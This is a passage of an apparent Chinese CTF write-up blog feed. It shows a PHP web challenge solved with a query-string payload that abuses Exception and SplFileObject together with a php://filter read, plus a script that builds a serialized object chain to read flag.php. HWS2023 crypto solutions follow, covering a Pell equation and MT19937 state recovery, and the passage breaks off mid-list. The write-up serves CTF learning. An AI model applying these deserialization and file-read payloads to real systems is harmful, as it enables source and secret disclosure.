href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a><br>用Exception和<code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code>绕过<br><code>payload:?class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>拿到源码构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1 = <span class="hljs-variable">$b1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;r1 = <span class="hljs-variable">$r1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$w</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w = <span class="hljs-variable">$w</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c1 = <span class="hljs-variable">$c1</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h1 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h1><h2 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h2><p><img src="/mdimg/2023sswk/5.png"><br><code>hsnctf&#123;399&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 冬令营</title>
    <link href="/2023/02/06/2023HWS/"/>
    <url>/2023/02/06/2023HWS/</url>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>题目信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag,a,b<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br> <br>D = <span class="hljs-number">0x1337</span><br><span class="hljs-keyword">assert</span> a**<span class="hljs-number">2</span> - D*b**<span class="hljs-number">2</span> == <span class="hljs-number">1</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>x = (a * m + b) % p<br>y=<span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:]<br>c=[y[i:i+<span class="hljs-number">85</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(y),<span class="hljs-number">85</span>)]<br>shuffle(c)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(c)<br> <br><span class="hljs-comment"># p=11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br><span class="hljs-comment"># c=[&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;, &#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;, &#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;, &#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;, &#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;, &#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;]</span><br></code></pre></td></tr></table></figure><p><strong>D = 0x1337 a2 - D*b2 == 1</strong><code>为Pell方程 网站在线（[http://www.numbertheory.org/php/pell.html](http://www.numbertheory.org/php/pell.html)）解一下，得到方程a，b的最小整数解 </code>a = 1809338099956399320，b = 25797719546469589</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br>D = <span class="hljs-number">0x1337</span><br>a = [<span class="hljs-number">1809338099956399320</span>]<br>b = [<span class="hljs-number">25797719546469589</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    a, b = a + [a[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>] + D * b[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>]], b + [a[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>] + b[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>]]<br><br>p=<span class="hljs-number">11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br>c=[<span class="hljs-string">&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;</span>, <span class="hljs-string">&#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;</span>, <span class="hljs-string">&#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;</span>, <span class="hljs-string">&#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;</span>, <span class="hljs-string">&#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;</span>, <span class="hljs-string">&#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;</span>]<br>res = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(res), <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> permutations(c)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    ai, bi = a[i], b[i]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> res:<br>        m = (c - bi) * inverse(ai, p) % p<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;flag&#123;5b80aaa2-2bb2-0ef1-4aa0-a5a9387239d5&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Numbers-Game"><a href="#Numbers-Game" class="headerlink" title="Numbers Game"></a>Numbers Game</h2><p>题目不难，比赛的时候没搞出来很难受呜呜呜<br>MT19937还原，根据624组32bit的数据还原state之后逆推上一组state进而得到前12个32bit的随机数值。参考: <a href="https://blog.csdn.net/zippo1234/article/details/109279944">https://blog.csdn.net/zippo1234/article/details/109279944</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp&gt;&gt;shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment">#逆求的32bit 组数 此处需要逆求12组</span><br>        tmp = state[i+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">397</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">396</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_state</span>(<span class="hljs-params">out</span>):<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out:<br>        i = inverse_right(i,<span class="hljs-number">18</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">15</span>,<span class="hljs-number">0xefc60000</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">7</span>,<span class="hljs-number">0x9d2c5680</span>)<br>        i = inverse_right(i,<span class="hljs-number">11</span>)<br>        state.append(i)<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">id</span>=[<span class="hljs-string">&#x27;d5d97afad7ef619b4badd8d2da10ee24&#x27;</span>, <span class="hljs-string">&#x27;67f4660a8335fb9f4152a9fbc44c9c77&#x27;</span>, <span class="hljs-string">&#x27;8cd43c85ebe9cc7036a37f47ccd1d1e4&#x27;</span>,<br>     <span class="hljs-string">&#x27;ee3e8c62e8b0100027589d6de82677ef&#x27;</span>, <span class="hljs-string">&#x27;463bb2f3731ad0e786302bf78da08330&#x27;</span>, <span class="hljs-string">&#x27;e245b1852a3b92734e46eb3421bd76c9&#x27;</span>,<br>     <span class="hljs-string">&#x27;0b74736786b4ab94651e3b706a548e55&#x27;</span>, <span class="hljs-string">&#x27;79cb596b28c2b4e02738f93b5bfbe0d3&#x27;</span>, <span class="hljs-string">&#x27;5a9c46837952952045564b5b395acad1&#x27;</span>,<br>     <span class="hljs-string">&#x27;d3c2d90a05d1a059fbeba4a05a608798&#x27;</span>, <span class="hljs-string">&#x27;4da0306c8ab58097d2fef9114e6fcb6d&#x27;</span>, <span class="hljs-string">&#x27;9707fabbd3c96de66917f15998ac9201&#x27;</span>,<br>     <span class="hljs-string">&#x27;9dd3e46fc930abfb523fe31e8ee8a658&#x27;</span>, <span class="hljs-string">&#x27;3716a8fd05f7388e7151d09431e61ee1&#x27;</span>, <span class="hljs-string">&#x27;9acf027679a6d7a674a43dee4f5bea35&#x27;</span>,<br>     <span class="hljs-string">&#x27;78702a2b125a940519337b1bf50aff8a&#x27;</span>, <span class="hljs-string">&#x27;262cf3b8c8072a602048a24756c83fcf&#x27;</span>, <span class="hljs-string">&#x27;092f8d227ec583c4734a6f449de521a3&#x27;</span>,<br>     <span class="hljs-string">&#x27;712aa300302b57fed458553426348fce&#x27;</span>, <span class="hljs-string">&#x27;834d4a0ea451cc04b469636b18c56435&#x27;</span>, <span class="hljs-string">&#x27;754b5284b14402c61e3b1e56cb2d41e9&#x27;</span>,<br>     <span class="hljs-string">&#x27;51d742ca6a341032afcb5dc645f54bfa&#x27;</span>, <span class="hljs-string">&#x27;c1a33d104f47e33d6932905b483a2018&#x27;</span>, <span class="hljs-string">&#x27;3def7c2a14cff6b2864a2100956df07f&#x27;</span>,<br>     <span class="hljs-string">&#x27;7e3606e4ec1c99fe5a8593ae44f25a70&#x27;</span>, <span class="hljs-string">&#x27;404c6139570883dbab8e5a299d7a5017&#x27;</span>, <span class="hljs-string">&#x27;f07597079e1b68ebb4e2d16b83b7b484&#x27;</span>,<br>     <span class="hljs-string">&#x27;0723daf5c65f8ba6cd6e43fcdf9d18dc&#x27;</span>, <span class="hljs-string">&#x27;4c54db12829f165837384b66978e8438&#x27;</span>, <span class="hljs-string">&#x27;cd056e64e1f31461cab2e66ece9d3278&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f6ae16fab122cbce240e32464a1ab57&#x27;</span>, <span class="hljs-string">&#x27;f86e0e9ee23498340f62d8617f6f5218&#x27;</span>, <span class="hljs-string">&#x27;af4ebe2535885c783c89f8d8c4815076&#x27;</span>,<br>     <span class="hljs-string">&#x27;c8eae5b5c7aca2c5fdb4f284e2cf65c5&#x27;</span>, <span class="hljs-string">&#x27;bec0d8ecabedd9811a8ecb6052b21d8c&#x27;</span>, <span class="hljs-string">&#x27;731bd3421b6517aa101357fe1c49caf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;344f4a26cdaf1a782d9b32208e1a3e92&#x27;</span>, <span class="hljs-string">&#x27;892b1741d304878461dd0774a335ea3d&#x27;</span>, <span class="hljs-string">&#x27;56e2a484ca40f43e059bf5f0bd822bdc&#x27;</span>,<br>     <span class="hljs-string">&#x27;d7c0762df71b31c14654147fb9a0595c&#x27;</span>, <span class="hljs-string">&#x27;57016a179ba5509f6b04a161ac628b34&#x27;</span>, <span class="hljs-string">&#x27;e49a2d573522c1ee3e8348ceca0295a4&#x27;</span>,<br>     <span class="hljs-string">&#x27;4b0f49c7e6469e82832e9cc90b9e17c0&#x27;</span>, <span class="hljs-string">&#x27;eadc9d0c8b75127fe0a7f71881de1ea7&#x27;</span>, <span class="hljs-string">&#x27;db9fe5537768207bd8cdf770bcd42dfa&#x27;</span>,<br>     <span class="hljs-string">&#x27;ba2f57578752628d1ecac419b3a8bc36&#x27;</span>, <span class="hljs-string">&#x27;3752e70b5d2b578a8d412d84aab43705&#x27;</span>, <span class="hljs-string">&#x27;54e97795df8781c776cbb1ce4f5f31fc&#x27;</span>,<br>     <span class="hljs-string">&#x27;32794880abc9f68102c24e92ad9c7cd5&#x27;</span>,<br>     <span class="hljs-string">&#x27;b5eb7e651ca298f6873694c47d1cd3da&#x27;</span>, <span class="hljs-string">&#x27;a188934777d2c67e3d59692135005497&#x27;</span>, <span class="hljs-string">&#x27;34c308fa1644b387169ea88c1b575490&#x27;</span>]<br>    code=[<span class="hljs-string">&#x27;2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6&#x27;</span>,<br>     <span class="hljs-string">&#x27;017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6&#x27;</span>,<br>     <span class="hljs-string">&#x27;e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc&#x27;</span>,<br>     <span class="hljs-string">&#x27;0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c&#x27;</span>,<br>     <span class="hljs-string">&#x27;091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4&#x27;</span>,<br>     <span class="hljs-string">&#x27;5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630&#x27;</span>,<br>     <span class="hljs-string">&#x27;37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8&#x27;</span>,<br>     <span class="hljs-string">&#x27;c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10&#x27;</span>,<br>     <span class="hljs-string">&#x27;e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d&#x27;</span>,<br>     <span class="hljs-string">&#x27;f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217&#x27;</span>,<br>     <span class="hljs-string">&#x27;0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9&#x27;</span>,<br>     <span class="hljs-string">&#x27;abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d&#x27;</span>,<br>     <span class="hljs-string">&#x27;6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01&#x27;</span>,<br>     <span class="hljs-string">&#x27;b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b&#x27;</span>,<br>     <span class="hljs-string">&#x27;20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede&#x27;</span>,<br>     <span class="hljs-string">&#x27;606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f&#x27;</span>,<br>     <span class="hljs-string">&#x27;1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2&#x27;</span>,<br>     <span class="hljs-string">&#x27;fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5&#x27;</span>,<br>     <span class="hljs-string">&#x27;7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e&#x27;</span>,<br>     <span class="hljs-string">&#x27;ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7&#x27;</span>,<br>     <span class="hljs-string">&#x27;ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3&#x27;</span>,<br>     <span class="hljs-string">&#x27;4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e&#x27;</span>,<br>     <span class="hljs-string">&#x27;06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48&#x27;</span>,<br>     <span class="hljs-string">&#x27;947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56&#x27;</span>,<br>     <span class="hljs-string">&#x27;a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1&#x27;</span>,<br>     <span class="hljs-string">&#x27;31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d&#x27;</span>,<br>     <span class="hljs-string">&#x27;974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf&#x27;</span>,<br>     <span class="hljs-string">&#x27;e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07&#x27;</span>,<br>     <span class="hljs-string">&#x27;ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64&#x27;</span>,<br>     <span class="hljs-string">&#x27;86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd&#x27;</span>,<br>     <span class="hljs-string">&#x27;59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d&#x27;</span>,<br>     <span class="hljs-string">&#x27;02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63&#x27;</span>,<br>     <span 